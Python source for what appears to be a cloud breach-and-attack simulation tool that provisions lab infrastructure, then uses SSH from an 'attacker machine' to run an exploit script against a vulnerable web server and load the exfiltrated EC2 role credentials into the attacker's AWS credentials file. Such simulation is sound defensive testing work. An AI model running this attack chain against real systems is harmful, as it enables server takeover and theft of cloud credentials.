import pyfiglet
from termcolor import colored
import time
import subprocess
import json

def loading_animation():
    chars = "/—\\|"
    for _ in range(10):
        for char in chars:
            print(f"\rLoading {char}", end="", flush=True)
            time.sleep(0.1)
    
def scenario_execute():
    print("-"*30)
    print(colored("Executing Scenraio 1 : Exploit Vulnerable Application, EC2 takeover, Credential Exfiltration & Anomalous Compute Provisioning ", color="red"))
    loading_animation()
    print("-"*30)
    print(colored("Rolling out Infra", color="red"))
    loading_animation()
    print("-"*30)
    subprocess.call("cd ../infra && pulumi up -s dev -y", shell=True)
    
    print("-"*30)
    print(colored("Bringing up the Vulnerable Application", color="red"))
    loading_animation()
    subprocess.call("sleep 300", shell=True)

    print("-"*30)
    print(colored("Export Meta Data of Infra", color="red"))
    subprocess.call("source metadata.sh", shell=True)

    print("-"*30)
    print(colored("Get into the attacker machine - Tor Node", color="red"))
    loading_animation()

    with open("output.json", "r") as file:
        data = json.load(file)

    ATTACKER_SERVER_PUBLIC_IP = data["Attacker Server Public IP"]
    WEB_SERVER_PUBLIC_IP = data["Web Server Public IP"]

    print("Web Server Public IP: ", WEB_SERVER_PUBLIC_IP)

    print("-"*30)
    print(colored("Running exploit on Remote Web Server", color="red"))
    loading_animation()
    subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i /tmp/panw ubuntu@"+ATTACKER_SERVER_PUBLIC_IP+" 'sudo python3 exploit.py "+WEB_SERVER_PUBLIC_IP+" > /home/ubuntu/.aws/credentials'", shell=True)

    print("-"*30)
    print(colored("Initiate EC2 takeover, got Shell Access", color="red"))
    loading_animation()

    print("-"*30)
    print(colored("Exfiltrate Node Role Credentials and loading Creds in Attackers Machine", color="red"))
    loading_animation()

    print("-"*30)
    print(colored("Role Details", color="red"))
    loading_animation()
    subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i /tmp/panw ubuntu@"+ATTACKER_SERVER_PUBLIC_IP+" 'aws sts get-caller-identity'", shell=True)


def print_ascii_art(text):
    ascii_art = pyfiglet.figlet_format(text)
    print(colored(ascii_art, color="cyan"))

def select_cloud_provider():
    print(colored("Select Cloud Provider:", color="yellow"))
    print(colored("1. AWS", color="green"))
    print(colored("2. Azure", color="green"))
    print(colored("3. GCP", color="green"))
    while True:
        try:
            choice = int(input(colored("Enter your choice (1/2/3): ", color="yellow")))
            if choice not in [1, 2, 3]:
                raise ValueError(colored("Invalid choice. Please enter 1, 2, or 3.", color="red"))
            return choice
        except ValueError as e:
            print(e)

def select_attack_scenario():
    print(colored("Select Attack Scenario:", color="yellow"))
    print(colored("1. Exploit Vulnerable Application, EC2 takeover, Credential Exfiltration & Anomalous Compute Provisioning", color="green"))
    print(colored("2. Coming Soon", color="green"))
    while True:
        try:
            choice = int(input(colored("Enter your choice: ", color="yellow")))
            if choice not in [1, 2]:
                raise ValueError(colored("Invalid choice. Please enter 1 or 2.", color="red"))
            return choice
        except ValueError as e:
            print(e)

def get_credentials():
    while True:
        try:
            access_key = input(colored("Enter Access Key: ", color="yellow"))
            if not access_key:
                raise ValueError(colored("Access Key cannot be empty.", color="red"))
            secret_key = input(colored("Enter Secret Key: ", color="yellow"))
            if not secret_key:
                raise ValueError(colored("Secret Key cannot be empty.", color="red"))
            return access_key, secret_key
        except ValueError as e:
            print(e)

def execute_scenario():
    try:
        # Call the scenario function from the imported module
        scenario_execute()
        print(colored("Scenario executed successfully!", color="green"))
    except Exception as e:
        print(colored("Error executing scenario:", color="red"), str(e))

def main():
    tool_name = "C N B A S"
    print_ascii_art(tool_name)

    cloud_choice = select_cloud_provider()
    scenario_choice = select_attack_scenario()
    access_key, secret_key = get_credentials()

    if scenario_choice == 1:
        # Pass the selected scenario module to execute
        execute_scenario()
    elif scenario_choice == 2:
        print(colored("Scenario coming soon!", color="yellow"))

if __name__ == "__main__":
    main()



